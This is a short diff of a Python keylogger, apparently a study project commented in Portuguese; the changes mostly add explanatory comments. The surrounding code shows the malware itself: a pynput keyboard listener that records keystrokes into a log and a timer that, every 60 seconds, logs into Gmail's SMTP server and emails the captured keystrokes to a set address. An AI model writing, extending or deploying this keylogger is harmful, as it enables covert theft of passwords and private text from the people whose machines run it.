@@ -1,7 +1,7 @@
-from pynput import keyboard
-import smtplib
-from email.mime.text import MIMEText
-from threading import Timer
+from pynput import keyboard # Captura e controle de eventos do teclado (Listener, Key, e key.char)
+import smtplib # Biblioteca padrão para enviar e-mails via protocolo SMTP.
+from email.mime.text import MIMEText # Classe para construir o corpo de um e-mail em texto simples (MIME).
+from threading import Timer # Importa a classe Timer do módulo threading
 
 log = ""
 
@@ -18,7 +18,7 @@ def enviar_email():
         msg['To'] = EMAIL_DESTINO
 
         try:
-            server = smtplib.SMTP("smtp.gmail.com", 587)  # Corrigido host
+            server = smtplib.SMTP("smtp.gmail.com", 587)  #  host 
             server.starttls()
             server.login(EMAIL_ORIGEM, SENHA_EMAIL)
             server.send_message(msg)
@@ -28,7 +28,7 @@ def enviar_email():
 
         log = ""  # Resetar log somente após envio
 
-    Timer(60, enviar_email).start()  # Executa novamente após 60 segundos
+    Timer(60, enviar_email).start()  # Executa novamente após 60 segundos 
 
 def on_press(key):
     global log
